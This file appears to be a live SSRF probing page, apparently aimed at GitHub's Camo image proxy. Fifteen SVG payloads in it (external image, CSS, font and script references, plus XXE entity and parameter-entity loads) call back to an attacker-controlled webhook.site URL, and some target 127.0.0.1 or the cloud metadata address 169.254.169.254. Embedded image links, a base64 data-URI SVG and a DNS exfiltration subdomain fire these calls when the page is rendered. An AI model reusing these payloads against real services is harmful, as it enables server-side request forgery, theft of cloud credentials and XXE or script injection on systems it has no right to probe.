# Security Research - v30

## SVG-Based SSRF Deep Dive

SVG files can contain various external references. Testing if Camo processes SVG content.

---

### 1) SVG with xlink:href External Image

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xlink.gif" width="100" height="100"/>
</svg>
```

![svg-xlink](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xlink-test.svg)

---

### 2) SVG with foreignObject

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <img src="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-foreign.gif"/>
  </foreignObject>
</svg>
```

![svg-foreign](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-foreign-test.svg)

---

### 3) SVG use Element with External Reference

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/external.svg#shape"/>
</svg>
```

![svg-use](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-use-test.svg)

---

### 4) SVG with External CSS

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <style>@import url(https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/style.css);</style>
</svg>
```

![svg-css](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-css-test.svg)

---

### 5) SVG with External Font

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <defs>
    <font-face font-family="ExternalFont">
      <font-face-uri xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/font.woff"/>
    </font-face>
  </defs>
</svg>
```

![svg-font](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-font-test.svg)

---

### 6) SVG with Script (XSS + SSRF)

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/script.js"/>
</svg>
```

![svg-script](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-script-test.svg)

---

### 7) SVG with ENTITY External Reference (XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/xxe">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

![svg-xxe](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xxe-test.svg)

---

### 8) SVG with Parameter Entity (XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/evil.dtd">
  %remote;
]>
<svg xmlns="http://www.w3.org/2000/svg"></svg>
```

![svg-param](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-param-test.svg)

---

### 9) Inline SVG Data URI with External Ref

![data-svg](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSBocmVmPSJodHRwczovL3dlYmhvb2suc2l0ZS9lZmRhMzBjNi0xNzRiLTRjYjMtOThlNy0wMzdmMzlkMTlkNzIvZGF0YS1zdmcuZ2lmIi8+PC9zdmc+)

---

### 10) GitHub Raw SVG URL

Testing if GitHub serves raw SVG with external references:

![raw-svg](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)

---

### 11) SVG with feImage Filter

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <filter id="f1">
      <feImage xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/feimage.gif"/>
    </filter>
  </defs>
  <rect filter="url(#f1)" width="100" height="100"/>
</svg>
```

![svg-feimage](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-feimage-test.svg)

---

### 12) SVG Animation with External Value

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image>
    <animate attributeName="xlink:href" values="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/anim.gif" dur="1s"/>
  </image>
</svg>
```

![svg-animate](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-animate-test.svg)

---

### 13) SVG Pattern with External Image

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <pattern id="p1">
      <image xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/pattern.gif"/>
    </pattern>
  </defs>
</svg>
```

![svg-pattern](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-pattern-test.svg)

---

### 14) SVG with Internal IP in xlink

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://127.0.0.1:80/internal" width="100" height="100"/>
</svg>
```

![svg-internal](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-internal-test.svg)

---

### 15) SVG with Cloud Metadata in xlink

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>
```

![svg-metadata](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-metadata-test.svg)

---

### DNS Exfil

![dns](https://v30-dns.efda30c6-174b-4cb3-98e7-037f39d19d72.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/v30-canary.gif)

---

*v30 - SVG-based SSRF deep dive*
